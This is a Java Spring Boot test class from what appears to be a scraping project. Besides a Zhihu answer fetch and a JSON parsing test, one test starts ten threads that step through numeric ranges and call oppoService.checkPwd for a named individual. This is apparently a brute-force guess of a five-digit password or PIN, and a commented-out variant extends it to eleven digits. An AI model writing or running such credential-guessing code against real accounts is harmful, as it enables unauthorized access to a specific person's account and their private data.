package com.lsy.pc;

import com.google.gson.Gson;
import com.lsy.pc.model.json.zhihu.ZhihuModel;
import com.lsy.pc.service.OPPOService;
import com.lsy.pc.service.ZhiHuService;
import com.lsy.pc.utils.JsonUtils;
import com.lsy.pc.utils.ReadUtils;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringRunner;

import java.io.IOException;

/**
 * @author LSY
 * @version 1.0
 * @date 2019/6/28 14:53
 */
@RunWith(SpringRunner.class)
@SpringBootTest
public class MTest {

    @Autowired
    private ZhiHuService zhiHuService;

    @Autowired
    private OPPOService oppoService;


    @Test
    public void test01() {
        zhiHuService.getAnswers("310213933", 0);

    }

    @Test
    public void test02() throws IOException {
        String s = ReadUtils.readTxtFile("C:\\code\\pc\\src\\main\\resources\\txt\\json.txt");
        Gson gson = new Gson();
        ZhihuModel zhihuModel = JsonUtils.readValue(s, ZhihuModel.class);
        System.out.println(zhihuModel.getPaging().is_start());
    }


    @Test
    public void test03() throws InterruptedException {
        dT t1 = new dT();
        t1.setI(10000L);
        dT t2 = new dT();
        t2.setI(20000L);
        dT t3 = new dT();
        t3.setI(30000L);

        dT t4 = new dT();
        t4.setI(40000L);
        dT t5 = new dT();
        t5.setI(50000L);
        dT t6 = new dT();
        t6.setI(60000L);

        dT t7 = new dT();
        t7.setI(70000L);
        dT t8 = new dT();
        t8.setI(80000L);
        dT t9 = new dT();
        t9.setI(90000L);
        dT t0 = new dT();
        t0.setI(0L);

        t1.start();
        t2.start();
        t3.start();
        t4.start();
        t5.start();
        t6.start();
        t7.start();
        t8.start();
        t9.start();
        t0.start();


        Thread.sleep(Long.MAX_VALUE);
    }


//    class tt implements Runnable {
//
//        @Override
//        public void run() {
//            System.out.println("ewewq");
//            Long l = 1000L;
//            while (l.toString().length() < 11) {
//                oppoService.checkPwd("宋玲玲", l, 11);
//                l++;
//            }
//            System.out.println("ewewq");
//        }
//    }

    public class dT extends Thread {

        private Long l;

        public Long getI() {
            return l;
        }

        public void setI(Long l) {
            this.l = l;
        }

        @Override
        public void run() {

            while (l.toString().length() <= 5) {
                oppoService.checkPwd("宋玲玲", l, 5);
                l++;
            }
        }
    }
}

